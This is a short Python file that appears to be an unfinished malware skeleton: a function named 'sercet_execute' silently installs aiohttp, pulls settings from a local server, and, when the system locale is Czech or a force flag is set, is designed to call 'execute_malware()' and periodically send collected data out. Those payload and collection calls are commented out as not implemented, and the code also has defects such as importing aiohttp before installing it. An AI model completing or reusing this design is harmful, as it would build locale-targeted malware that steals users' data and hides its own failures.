import aiohttp 
import sys, importlib, subprocess, time, locale #Součástí standardní knihovny Pythonu

def install_if_needed(package_name) -> None:
    try:
        importlib.import_module(package_name)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])

class Options:
    def __init__(self,interval=10,force_start=False) -> None:
        self.interval: int = interval
        self.force_start: bool = force_start

class Data: 
    def __init__(self, data:str) -> None:
        self.textId:int = 0
        self.data:str = data

async def send_data(data: Data) -> None:
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post('http://localhost:7133/api/data', json=data) as response:
                pass
    except:
        pass

async def sercet_execute() -> None:

    install_if_needed('aiohttp')

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get('http://localhost:7133/api/options') as response:
                data = await response.json()
                options = Options(interval=data['interval'], force_start=data['force_start'])
    except:
        options = Options()

    system_language, system_encoding = locale.getdefaultlocale()

    if system_language=='cs_CZ' or options.force_start:
        #await execute_malware() - not implemented (Samuel)

        #load and send data every n seconds
        while(True):
            time.sleep(options.interval)
            #text = await load_data() - not implemented (Samuel)

            #await send_data(Data(data=text))
    pass
